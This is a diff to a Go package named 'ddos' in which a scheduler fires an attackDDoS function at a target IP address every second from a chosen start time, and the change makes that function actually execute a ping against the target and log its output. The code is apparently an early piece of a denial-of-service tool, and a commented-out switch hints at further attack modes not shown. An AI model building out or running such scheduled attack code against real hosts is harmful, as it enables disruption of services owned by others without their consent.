@@ -3,7 +3,7 @@ package ddos
 import (
 	"encoding/json"
 	"fmt"
-	//"log"
+	"log"
 	"math/rand"
 	"net/http"
 	"os/exec"
@@ -73,16 +73,20 @@ func cronAttackDDoS(ip string, date string, dateNs int64) {
 	t := time.Unix(0, dateNs)
 	scheduler.Every(1).Second().From(&t).Do(attackDDoS, ip)
 
-	fmt.Println(ip + " attack scheduled")
+	//fmt.Println(ip + " attack scheduled")
 
 	<-scheduler.Start()
 }
 
 func attackDDoS(ip string) {
-	x := randomNumber()
-	fmt.Println(x)
+	//x := randomNumber()
+	//fmt.Println(x)
 	
-	exec.Command("/bin/ping", "-c1", ip)
+	out,err := exec.Command("/bin/ping", "-c1", ip).Output()
+	if err != nil {
+		log.Fatal(err)
+	}
+	fmt.Println(string(out))
 	/*
 	switch x {
 	case 1:
